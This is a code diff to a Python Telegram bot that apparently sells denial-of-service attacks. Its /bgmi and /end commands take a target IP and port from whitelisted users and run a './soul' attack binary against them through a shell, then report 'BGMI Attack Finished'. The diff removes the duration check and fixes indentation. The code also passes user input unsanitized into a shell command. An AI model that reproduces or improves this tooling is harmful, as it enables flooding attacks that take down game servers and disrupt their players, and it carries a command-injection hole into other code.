@@ -231,53 +231,46 @@ def handle_bgmi(message):
                 return
             # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-        
+
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 3:  # Updated to accept target and port
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 300:
-                response = "Error: Time interval must be less than 300."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soul {target} {port} 1 300"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port}"
+            port = int(command[2])  # Convert port to integer
+            record_command_logs(user_id, '/bgmi', target, port)
+            log_command(user_id, target, port)
+            start_attack_reply(message, target, port)  # Call start_attack_reply function
+            full_command = f"./soul {target} {port} 1 300"
+            subprocess.run(full_command, shell=True)
+            response = f"BGMI Attack Finished. Target: {target} Port: {port}"
         else:
-            response = "Usage :- /bgmi <target> <port>"  # Updated command syntax
+            response = "Usage: /bgmi <target> <port>"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command."
 
     bot.reply_to(message, response)
 
 
-    # Handler for /end command
-    @bot.message_handler(commands=['end'])
-    def handle_end(message):
-        user_id = str(message.chat.id)
-        if user_id in allowed_user_ids:
-            command = message.text.split()
-            if len(command) == 4:  # Updated to accept target, time, and port
-                target = command[1]
-                port = int(command[2])  # Convert port to integer
-                time = int(command[3])  # Convert time to integer
-                if time > 300:
-                    response = "Error: Time interval must be less than 300."
-                else:
-                    record_command_logs(user_id, '/end', target, port, time)
-                    log_command(user_id, target, port, time)
-                    full_command = f"./soul {target} {port} 2 300"
-                    subprocess.run(full_command, shell=True)
-                    response = f"BGMI Attack Finished. Target: {target} Port: {port}"
-            else:
-                response = "Usage: /end <target> <port>"  # Updated command syntax
+# Handler for /end command
+@bot.message_handler(commands=['end'])
+def handle_end(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        command = message.text.split()
+        if len(command) == 3:  # Updated to accept target and port
+            target = command[1]
+            port = int(command[2])  # Convert port to integer
+            record_command_logs(user_id, '/end', target, port)
+            log_command(user_id, target, port)
+            full_command = f"./soul {target} {port} 2 300"
+            subprocess.run(full_command, shell=True)
+            response = f"BGMI Attack Finished. Target: {target} Port: {port}"
         else:
-            response = "You Are Not Authorized To Use This Command."
+            response = "Usage: /end <target> <port>"  # Updated command syntax
+    else:
+        response = "You Are Not Authorized To Use This Command."
 
-        bot.reply_to(message, response)
+    bot.reply_to(message, response)
+
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
